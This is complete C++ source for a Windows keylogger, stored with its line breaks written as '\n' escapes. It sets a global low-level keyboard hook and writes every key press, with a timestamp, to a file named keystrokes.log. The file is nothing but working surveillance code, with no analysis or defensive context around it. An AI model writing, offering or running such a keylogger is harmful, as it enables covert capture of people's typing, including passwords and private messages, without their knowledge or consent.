#include <Windows.h>\n#include <fstream>\n#include <ctime>\n#include <iostream>\n\n// Constants\nconst char* logFile = "keystrokes.log";  // Log file name\nHHOOK keyboardHook;                       // Keyboard hook handle\n\n// Function to get the current timestamp\nstd::string getCurrentTimestamp() {\n    time_t now = time(0);\n    tm* ltm = localtime(&now);\n    char buffer[20];\n    sprintf(buffer, "%04d-%02d-%02d %02d:%02d:%02d",\n            1900 + ltm->tm_year, ltm->tm_mon + 1, ltm->tm_mday,\n            ltm->tm_hour, ltm->tm_min, ltm->tm_sec);\n    return std::string(buffer);\n}\n\n// Function to log keystrokes\nLRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (nCode == HC_ACTION) {\n        KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);\n        if (wParam == WM_KEYDOWN) {\n            // Log the key\n            std::ofstream logFileStream(logFile, std::ios::app);\n            if (logFileStream.is_open()) {\n                logFileStream << getCurrentTimestamp() << " Key Pressed: " << kbStruct->vkCode << std::endl;\n            } else {\n                std::cerr << "Error opening log file!" << std::endl;\n            }\n        }\n    }\n    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);\n}\n\n// Main function\nint main() {\n    // Set up the keyboard hook\n    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);\n    if (keyboardHook == NULL) {\n        std::cerr << "Failed to set hook!" << std::endl;\n        return -1;\n    }\n\n    // Message loop to keep the program running\n    MSG message;\n    while (GetMessage(&message, NULL, 0, 0)) {\n        TranslateMessage(&message);\n        DispatchMessage(&message);\n    }\n\n    // Cleanup\n    UnhookWindowsHookEx(keyboardHook);\n    return 0;\n}